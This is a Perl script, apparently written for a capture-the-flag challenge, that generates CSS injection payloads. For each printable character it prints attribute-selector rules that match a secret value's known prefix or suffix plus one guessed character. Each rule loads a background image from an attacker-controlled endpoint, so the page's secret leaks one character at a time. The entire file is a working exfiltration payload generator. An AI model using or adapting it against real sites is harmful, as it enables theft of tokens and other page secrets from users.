#!/usr/bin/perl

use strict;
use warnings;

my %skipChars = (ord("\""), 1, ord("\\"), 1);

my $endpoint = @ARGV > 0 ? $ARGV[0] : "http://localhost/";
my $prefix = @ARGV > 1 ? $ARGV[1] : "FLAG{";
my $suffix = @ARGV > 2 ? $ARGV[2] : "}";

for (my $i = 0x20; $i < 0x7f; $i++) {
	unless (defined($skipChars{$i})) {
		my $c = chr($i);
		print ".btn[data-content*=\"$prefix$c\"] {";
		print " background: url(\"$endpoint$prefix$c\");";
		print " }\n";
		print ".btn[data-content*=\"$c$suffix\"] + a {";
		print " background: url(\"$endpoint$c$suffix\");";
		print " }\n";
	}
}
